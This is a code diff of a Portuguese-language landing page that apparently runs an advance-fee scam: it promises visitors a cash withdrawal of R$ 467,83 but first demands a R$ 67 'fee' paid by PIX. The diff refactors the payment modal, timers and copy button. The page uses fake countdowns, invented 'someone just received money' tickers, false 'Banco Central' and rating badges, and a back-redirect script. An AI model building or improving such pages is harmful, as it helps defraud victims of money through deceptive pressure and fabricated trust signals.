@@ -18,6 +18,8 @@
     <span>⏱</span>
     🔥 ÚLTIMOS MINUTOS! Seu saque expira em:&nbsp;<strong id="alertTimer">9:51</strong>
   </div>
+
+  <!-- ② Video Vturb -->
   <vturb-smartplayer id="vid-69e18162f11e94b651081061"
     style="display: block; margin: 0 auto; width: 100%; "></vturb-smartplayer>
   <script
@@ -270,68 +272,18 @@
     </div>
   </div>
 
-  <!-- Space for sticky bar -->
-  <div style="height:88px;"></div>
+  <!-- Espaço para a barra CTA fixa não cobrir conteúdo -->
+  <div style="height:104px;"></div>
 
-  <!-- ⑪ Sticky CTA bar -->
+  <!-- ⑪ CTA bar — FIXED na parte inferior, sempre visível -->
   <div class="cta-sticky">
-    <button class="cta-btn" id="ctaBtn" onclick="abrirPix()">
+    <button class="cta-btn" id="ctaBtn" onclick="abrirPix(67)">
       💰 LIBERAR MEU SAQUE DE&nbsp;<span id="ctaAmt">R$ 0,00</span>&nbsp;✨
     </button>
     <div class="cta-meta">
       🔒 Pagamento 100% Seguro e Criptografado
       &bull; 🏦 Banco Central
       &bull; ⭐ 4,8/5
-    </div>
-  </div>
-
-  <!-- ⑫ PIX Modal (bottom sheet on mobile) -->
-  <div class="pix-overlay" id="pixOverlay" role="dialog" aria-modal="true"
-    aria-label="Pagar via PIX">
-    <div class="pix-card" id="pixCard">
-      <div class="pix-handle"></div>
-      <button class="pix-close" onclick="fecharPix()" aria-label="Fechar">✕</button>
-
-      <div class="pix-card-header">
-        <div class="pix-icon">⚡</div>
-        <div class="pix-title">Aguardando Pagamento</div>
-        <div class="pix-timer">Expira em: <span id="timer">15:00</span></div>
-        <div class="pix-desc">
-          Para liberar o saque de <strong>R$ 467,83</strong>, finalize o pagamento da taxa no valor de
-          <strong id="pixValorDisplay">R$ 67,00</strong>.
-        </div>
-      </div>
-
-      <div class="pix-code-box">
-        <div id="qrCodeContainer" style="display:none; text-align:center; margin-bottom:15px;">
-           <img id="pixQrImg" src="" style="width:200px; height:200px; display:inline-block; border-radius:12px; border: 1px solid var(--slate-200); padding: 5px; background: #fff;">
-        </div>
-        
-        <div class="pix-code-label">Chave PIX — Copia e Cola:</div>
-        <div class="pix-code-value" id="pixCode">Gerando seu PIX...</div>
-        <button class="btn-copy" id="copyBtn" onclick="copiarPix()">
-          📋 Copiar Chave PIX
-        </button>
-      </div>
-
-      <div class="pix-how">
-        <p style="font-size:13px;font-weight:700;color:#065f46;margin-bottom:7px;">Como pagar:</p>
-        <p style="font-size:13px;color:#475569;line-height:1.85;">
-          1. Abra seu banco ou carteira digital<br>
-          2. Selecione <strong>PIX Copia e Cola</strong><br>
-          3. Cole a chave copiada<br>
-          4. Confirme o valor de <strong>R$ 67,00</strong>
-        </p>
-      </div>
-
-      <div class="pix-live">
-        <div class="live-dot"></div>
-        <span style="font-size:13px;color:#16a34a;font-weight:600;">Validando pagamento em tempo real</span>
-      </div>
-
-      <p style="font-size:11px;color:#94a3b8;text-align:center;margin-top:10px;">
-        🔒 SSL Seguro &nbsp;·&nbsp; 🏦 Banco Central &nbsp;·&nbsp; ⭐ 4,8/5
-      </p>
     </div>
   </div>
 
@@ -344,7 +296,6 @@
     const bal = state.balance ?? 467.83;
     const fmtBrl = n => 'R$ ' + n.toFixed(2).replace('.', ',');
 
-    // Populate all amount placeholders
     document.getElementById('parAmt').textContent = fmtBrl(bal);
     document.getElementById('ctaAmt').textContent = fmtBrl(bal);
     document.getElementById('garBal').textContent = bal.toFixed(2).replace('.', ',');
@@ -352,7 +303,6 @@
     document.getElementById('step3Amt').textContent = fmtBrl(bal + 67);
 
     /* ============== TIMERS ============== */
-    // Alert bar countdown (random 8–12 min)
     let alertSecs = 591;
     setInterval(() => {
       if (alertSecs > 0) alertSecs--;
@@ -360,7 +310,6 @@
       document.getElementById('alertTimer').textContent = m + ':' + String(s).padStart(2, '0');
     }, 1000);
 
-    // Bonus 5-min countdown
     let bonusSecs = 300;
     const bInt = setInterval(() => {
       if (bonusSecs <= 0) { clearInterval(bInt); return; }
@@ -379,16 +328,6 @@
         `🔥&nbsp;<span>${n} acabou de receber R$ ${a} (há ${m} min)</span>`;
     }, 6500);
 
-    /* ============== VIDEO ============== */
-    function playVideo() {
-      document.getElementById('videoHolder').style.display = 'none';
-      const vid = document.getElementById('mainVideo');
-      vid.style.display = 'block';
-      // Video source not yet set. Add Vturb/YouTube embed here when ready.
-      // vid.src = 'seu-video.mp4';
-      // vid.play();
-    }
-
     /* ============== FAQ ============== */
     function toggleFaq(btn) {
       const ans = btn.nextElementSibling;
@@ -402,59 +341,59 @@
 
     /* ============== PIX MODAL ============== */
     let pollingInterval = null;
+    let timerInterval  = null;
 
     async function abrirPix(valor = 67) {
-      window.abrirPix = abrirPix; // garante acesso global
-      const overlay   = document.getElementById('pixOverlay');
-      const pixCode   = document.getElementById('pixCode');
-      const qrContainer = document.getElementById('qrCodeContainer');
-      const qrImg     = document.getElementById('pixQrImg');
+      const overlay    = document.getElementById('pixOverlay');
+      const pixCode    = document.getElementById('pixCode');
+      const qrCont     = document.getElementById('qrCodeContainer');
+      const qrImg      = document.getElementById('pixQrImg');
       const valDisplay = document.getElementById('pixValorDisplay');
+      const copyBtn    = document.getElementById('copyBtn');
 
-      // Mostra o valor correto (pode ser 67, 37 ou 27 dependendo da oferta)
+      // Atualiza valor na tela do modal
       if (valDisplay) valDisplay.textContent = 'R$ ' + valor.toFixed(2).replace('.', ',');
 
-      // Abre o bottom sheet imediatamente (via classe CSS)
+      // Abre o bottom sheet — apenas adicionar classe (CSS cuida do resto)
       overlay.classList.add('pix-open');
       document.body.style.overflow = 'hidden';
+
+      // Reset do estado visual
       pixCode.innerText = 'Gerando seu PIX...';
-      qrContainer.style.display = 'none';
-      document.getElementById('copyBtn').disabled = true;
+      qrCont.style.display = 'none';
+      copyBtn.disabled = true;
 
       try {
         const data = await PAY.createPix(valor);
 
-        // Atualiza Copia e Cola
         pixCode.innerText = data.copy_paste;
-        document.getElementById('copyBtn').disabled = false;
+        copyBtn.disabled = false;
 
-        // Atualiza QR Code
         if (data.qrcode) {
           qrImg.src = data.qrcode;
-          qrContainer.style.display = 'block';
+          qrCont.style.display = 'block';
         }
 
-        startTimer(900);
+        iniciarTimer(900);
         startPolling(data.id, valor);
       } catch (err) {
         pixCode.innerText = '❌ Erro ao gerar PIX. Feche e tente novamente.';
-        document.getElementById('copyBtn').disabled = false;
+        copyBtn.disabled = false;
         console.error('PIX error:', err);
       }
     }
-    // Expor globalmente para o backredirect.js
+    // Expor para o backredirect.js usar
     window.abrirPix = abrirPix;
 
-    function startTimer(duration) {
-      let timer = duration, minutes, seconds;
+    function iniciarTimer(duration) {
+      if (timerInterval) clearInterval(timerInterval);
+      let timer = duration;
       const display = document.getElementById('timer');
-      const interval = setInterval(() => {
-        minutes = parseInt(timer / 60, 10);
-        seconds = parseInt(timer % 60, 10);
-        minutes = minutes < 10 ? "0" + minutes : minutes;
-        seconds = seconds < 10 ? "0" + seconds : seconds;
-        display.textContent = minutes + ":" + seconds;
-        if (--timer < 0) clearInterval(interval);
+      timerInterval = setInterval(() => {
+        const m = String(Math.floor(timer / 60)).padStart(2, '0');
+        const s = String(timer % 60).padStart(2, '0');
+        display.textContent = m + ':' + s;
+        if (--timer < 0) clearInterval(timerInterval);
       }, 1000);
     }
 
@@ -466,9 +405,7 @@
           clearInterval(pollingInterval);
           PAY.trackPixel('Purchase', { value: valorPago, currency: 'BRL', content_name: 'Taxa CashNoPix' });
           SFX.success();
-          setTimeout(() => {
-            window.location.href = 'sucesso.html';
-          }, 1000);
+          setTimeout(() => { window.location.href = 'sucesso.html'; }, 1000);
         }
       }, 5000);
     }
@@ -477,25 +414,27 @@
       document.getElementById('pixOverlay').classList.remove('pix-open');
       document.body.style.overflow = '';
       if (pollingInterval) clearInterval(pollingInterval);
+      if (timerInterval)  clearInterval(timerInterval);
     }
 
-    // Fecha ao clicar fora do card
+    // Fechar ao clicar no backdrop
     document.getElementById('pixOverlay').addEventListener('click', e => {
       if (e.target === document.getElementById('pixOverlay')) fecharPix();
     });
 
-    // Swipe-down to close (mobile gesture)
+    // Swipe down para fechar (mobile)
     let touchStartY = 0;
-    const card = document.getElementById('pixCard');
-    card.addEventListener('touchstart', e => { touchStartY = e.changedTouches[0].clientY; }, { passive: true });
-    card.addEventListener('touchend', e => {
+    document.getElementById('pixCard').addEventListener('touchstart', e => {
+      touchStartY = e.changedTouches[0].clientY;
+    }, { passive: true });
+    document.getElementById('pixCard').addEventListener('touchend', e => {
       if (e.changedTouches[0].clientY - touchStartY > 60) fecharPix();
     }, { passive: true });
 
     /* ============== COPY PIX ============== */
     function copiarPix() {
       const code = document.getElementById('pixCode').textContent.trim();
-      const btn = document.getElementById('copyBtn');
+      const btn  = document.getElementById('copyBtn');
 
       function onCopied() {
         btn.textContent = '✅ Copiado com sucesso!';
@@ -525,5 +464,56 @@
     }
   </script>
 </body>
+
+<!-- ========================================================
+     PIX OVERLAY — fora do <body> para ficar acima de TUDO,
+     incluindo o CTA bar fixo e o back-redirect
+     ======================================================== -->
+<div class="pix-overlay" id="pixOverlay" role="dialog" aria-modal="true" aria-label="Pagar via PIX">
+  <div class="pix-card" id="pixCard">
+    <div class="pix-handle"></div>
+    <button class="pix-close" onclick="fecharPix()" aria-label="Fechar">✕</button>
+
+    <div class="pix-card-header">
+      <div class="pix-icon">⚡</div>
+      <div class="pix-title">Aguardando Pagamento</div>
+      <div class="pix-timer">Expira em: <span id="timer">15:00</span></div>
+      <div class="pix-desc">
+        Para liberar seu saque de <strong>R$ 467,83</strong>, finalize o pagamento de
+        <strong id="pixValorDisplay">R$ 67,00</strong>.
+      </div>
+    </div>
+
+    <div class="pix-code-box">
+      <div id="qrCodeContainer" style="display:none;text-align:center;margin-bottom:15px;">
+        <img id="pixQrImg" src="" style="width:200px;height:200px;display:inline-block;border-radius:12px;border:1px solid #e2e8f0;padding:5px;background:#fff;">
+      </div>
+      <div class="pix-code-label">Chave PIX — Copia e Cola:</div>
+      <div class="pix-code-value" id="pixCode">Gerando seu PIX...</div>
+      <button class="btn-copy" id="copyBtn" onclick="copiarPix()" disabled>
+        📋 Copiar Chave PIX
+      </button>
+    </div>
+
+    <div class="pix-how">
+      <p style="font-size:13px;font-weight:700;color:#065f46;margin-bottom:7px;">Como pagar:</p>
+      <p style="font-size:13px;color:#475569;line-height:1.85;">
+        1. Abra seu banco ou carteira digital<br>
+        2. Selecione <strong>PIX Copia e Cola</strong><br>
+        3. Cole a chave copiada<br>
+        4. Confirme o pagamento
+      </p>
+    </div>
+
+    <div class="pix-live">
+      <div class="live-dot"></div>
+      <span style="font-size:13px;color:#16a34a;font-weight:600;">Validando pagamento em tempo real</span>
+    </div>
+
+    <p style="font-size:11px;color:#94a3b8;text-align:center;margin-top:10px;">
+      🔒 SSL Seguro &nbsp;·&nbsp; 🏦 Banco Central &nbsp;·&nbsp; ⭐ 4,8/5
+    </p>
+  </div>
+</div>
 
 </html>
